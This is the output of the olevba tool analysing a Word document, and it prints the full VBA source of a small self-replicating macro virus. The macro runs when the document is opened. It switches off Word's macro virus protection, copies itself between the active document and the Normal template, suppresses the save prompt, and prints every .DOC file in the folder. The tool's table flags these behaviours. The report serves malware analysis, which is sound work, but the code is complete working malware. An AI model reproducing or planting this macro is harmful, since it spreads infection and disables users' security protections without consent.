olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Small
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Small - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

' Disable Macro Protection
Options.VirusProtection = (1 + 2 - 3):

' Copy Active to Normal
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Document_Open", 1, 10, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, 30, True, False, False) = False Then
    ActiveDocument.VBProject.VBComponents.Item(1).Export ("SkamWerks")
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("SkamWerks")
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    Options.SaveNormalPrompt = (-2 + 2)
' Copy From Normal to Active
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Document_Open", 1, 10, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, 30, True, False, False) = False Then
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("SkamWerks")
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    'Payload - Print Out All Docs in Local Directory.
    myDoc = Dir("*.DOC"): While myDoc <> "": Application.PrintOut FileName:=myDoc: myDoc = Dir(): Wend
  
End If
End Sub

' SmallWorld Virii - By Skammy of SkamWerks! http://pegasus.cc.ucf.edu/~kes65601
' Written for the sole purpose of the Smallest Word Class Macro Virii Contest!
' Please do not distrubute!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://pegasus.cc.uc|URL                                          |
|          |f.edu/~kes65601     |                                             |
+----------+--------------------+---------------------------------------------+

